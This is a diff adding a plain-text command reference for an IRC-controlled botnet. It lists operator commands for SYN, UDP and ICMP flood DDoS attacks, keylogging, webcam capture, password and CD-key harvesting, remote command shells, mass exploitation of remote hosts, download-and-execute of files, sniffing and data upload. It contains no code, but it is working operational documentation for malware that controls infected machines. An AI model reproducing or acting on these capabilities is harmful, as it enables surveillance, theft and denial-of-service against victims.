@@ -1,0 +1,136 @@
+Bot Commands (.txt file version)
+These commands change from mod-to-mod and
+from version-to-version. Read the source to get
+the current commands.
+
+irc.rndnick | irc.rn		-- randomly changes nick
+irc.disconnect | irc.d		-- disconnects	
+irc.logout  | irc.lo		-- logs you out
+irc.version | irc.ver		-- gives bot version
+irc.reconnect | irc.r		-- reconnects to the server
+irc.quit | irc.quit		-- quits the bot
+irc.die | irc.d			-- quits the bot
+irc.status | irc.s		-- gives the status of the bot
+irc.id | irc.i			-- gives the botid
+irc.destr0y | irc.dstr0		-- removes the bot
+irc.who 			-- shows who has logged into the bot
+irc.nick | irc.n		-- changes the nick of the bot
+irc.join | irc.j		-- joins a channel
+irc.part | irc.pt		-- parts a channel
+irc.raw | irc.r			-- allows you to issue RAWs
+irc.crash 			-- crashes the bot
+irc.setserve | irc.se		-- temporary on-the-fly server changing
+irc.dns | irc.dn		-- resolves a host/ip
+irc.log | irc.lg		-- displays a log of all bot activity
+irc.aliases | irc.al		-- lists the pre-defined aliases
+irc.visit | irc.v		-- allows you to visit a website
+irc.gethost | irc.gh		-- searches the bots for a given hostname
+irc.addalias | irc.aa		-- on the fly alias adding
+irc.privmsg | irc.pm		-- send pms
+irc.action | irc.ac		-- perform actions
+irc.cycle | irc.cy		-- hop a channel
+irc.mode | irc.m		-- set a mode
+irc.repeat | irc.rp		-- repeat
+irc.delay | irc.de		-- set a delay
+irc.activate                    -- botpasshere
+
+
+lockdown.on  | ld.on 		-- secures the bot
+lockdown.off | ld.off		-- un-secures bot
+lockdown.stop			-- stops the bot in the act of securing
+log.off				-- turns off the bot log
+dcc.get | dcc.gt		-- receive a file from the bot machine thru dcc
+mirc.cmd			-- perform irc commands on bot user's mirc client
+sniff on/off			-- enables/disables carnivore packet sniffer
+
+
+daemon.socks4.on | proxy.s4.on		-- starts a socks4 server
+daemon.rlogin.on | daemon.rl.on 	-- starts a rlogin server
+daemon.httpd.on | daemon.web.on		-- starts a webserver
+daemon.tftp.on | daemon.tf.on  		-- starts a tftp server
+daemon.redirect.on | daemon.rd.on 	-- starts a port redirect
+daemon.socks4.off 			-- stops socks4 server
+daemon.redirect.off			-- stops port redirect
+daemon.rlogin.off			-- stops rlogin server
+daemon.web.off				-- stops webserver
+daemon.tftp.off				-- stops tftp server
+daemon.ident on/off			-- enables/disables ident server
+
+ddos.off			-- stops standard ddos commands
+ddos.syn.off			-- stops synflooding
+ddos.udp.off			-- stops udpflooding
+ddos.ping.off			-- stops pingflooding
+ddos.syn 			-- starts generic synflood
+ddos.ack			-- starts ack flood
+ddos.random			-- starts random flood
+ddos.icmp | ddos.ic		-- sends icmps
+ddos.supersyn 			-- powerful synflood
+ddos.synflood | ddos.synf	-- oldschool synflood
+ddos.udpflood | ddos.udpf	-- oldschool udpflood
+ddos.pingflood | ddos.pingf	-- oldschool pingflood
+ddos.tcpflood | ddos.tcpf	-- oldschool tcpflood
+
+threads.list | threads.l	-- list the current bot threads
+threads.kill | threads.k	-- kill a current bot thread
+
+
+com.rebewt 			-- reboots the machine
+com.netinfo | com.ni		-- displays net information
+com.sysinfo | com.si		-- displays sys information
+com.procs | com.ps		-- lists running proccesses
+com.procs.off | com.ps.off	-- stops listing proccesses
+com.harvest | com.key 		-- lists cdkeys
+com.uptime | com.up		-- displays system uptime
+com.driveinfo | com.drv		-- displays drive information
+com.testdlls | com.dll		-- runs a crucial dll check
+com.opencmd | com.ocmd		-- opens up a remote cmd interface
+com.ocmd.off			-- clones remote cmd interface
+com.getclip | com.gc		-- displays what the user has on clipboard
+com.killprocname | com.kpn	-- kills a proccess by name
+com.prockillid | com.pkid	-- kills a proccess by id
+com.delete | com.del		-- deletes a file
+com.filelist | com.fl		-- lists files
+com.cmd | com.cm		-- issue a msdos-style command to the system
+com.readfile | com.rf		-- prints the contents of a file
+com.keylog on/off		-- enables/disables real-time keylogging
+com.net				-- issue commands using the ms net service
+com.open | com.o		-- opens a file (can be visible or invisible)
+com.capture | com.cap		-- captures picture/video from a webcam/video source/desktop
+com.execute | com.e		-- executes a file
+com.rename | com.mv		-- renames a file
+com.findfile | com.ff		-- search for a file
+com.findfile.off | com.ff.off	-- stops searching for a file
+com.findpass | com.fp		-- find system passwords (win9x only)
+
+util.flusharp | util.farp 	-- flushes ARP cache
+util.flushdns | util.fdns	-- flushes DNS cache
+util.clearlog | util.clg	-- clears bot log
+
+root.start | vuln.s		-- starts exploitation of remote/local systems
+root.currentip | vuln.cip	-- displays the current exploitation ip
+root.massexploit | vuln.mass	-- automatically scans from a hard-coded list of vulnerabilities
+root.stop			-- stops exploitation of remote/local systems
+root.stats | vuln.st		-- displays the status of exploitation process
+root.portscan | root.ps		-- standard port scan (not root.start)
+
+clone.start | clone.make 	-- create a clone
+clone.off			-- kill clone
+clone.raw | clone.ra		-- send RAWs to clone
+clone.mode | clone.m		-- clone mode setting
+clone.nick | clone.ni		-- clone nick setting
+clone.join | clone.j		-- make clone join channel
+clone.part | clone.p		-- make clone part channel
+clone.privmsg | clone.pm	-- make clone send pmsgs
+clone.quit | clone.q		-- make clone quit
+clone.rndnick | clone.rn	-- randomly change nick of clone
+clone.prefix | clone.pr		-- change clone prefix
+
+download.update | download.up	-- updates bot
+download.wget			-- download (and execute) file from website
+
+
+util.email 			-- sends emails
+util.httpcon | util.hcon	-- connect to a website
+ftp.upload			-- upload a file to a remote ftp
+
+
